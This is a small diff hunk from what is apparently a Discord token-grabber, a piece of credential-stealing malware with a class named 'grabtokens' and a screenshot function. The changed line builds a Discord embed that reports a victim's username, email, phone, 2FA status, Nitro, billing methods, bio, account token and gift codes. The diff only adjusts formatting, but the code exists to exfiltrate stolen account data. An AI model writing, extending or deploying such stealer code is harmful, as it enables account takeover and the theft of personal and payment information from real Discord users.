@@ -292,7 +292,7 @@ class grabtokens():
                 all_codes = "❌ No gift codes found"
                 title = ""
 
-            embed.add_field(name="DISCORD INFO", value=f'''`Discord Username:` **{username}** \n`Email:` **{email}**\n`Phone:` **{phone}**\n\n`2FA:` **{mfa}**\n`Nitro:` **{nitro}**\n`Billing:` **{methods}**\n\n`About Me:` ```{bio}```\n`Token:` **{token}**\n`{title}:` **{all_codes}**''', inline=False)
+            embed.add_field(name="DISCORD INFO", value=f'''`Discord Username:` **{username}** \n`Email:` **{email}**\n`Phone:` **{phone}**\n\n`2FA:` **{mfa}**\n`Nitro:` **{nitro}**\n`Billing:` **{methods}**\n\n`About Me:` ```{bio}```\n`Token:` **{token}**\n\n`{title}:` **{all_codes}**''', inline=False)
 
 def ss():
     ImageGrab.grab(
